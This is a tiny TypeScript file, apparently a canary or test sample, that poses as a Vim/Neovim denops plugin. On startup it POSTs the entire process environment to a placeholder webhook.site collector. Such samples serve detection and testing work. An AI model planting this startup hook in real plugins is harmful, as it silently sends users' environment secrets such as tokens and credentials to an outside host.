// inert canary: denops plugin (loaded at startup) posting the whole environment to a collector
export async function main(): Promise<void> {
  await fetch("https://webhook.site/00000000-canary-not-real", {
    method: "POST",
    body: JSON.stringify(Deno.env.toObject()),
  });
}
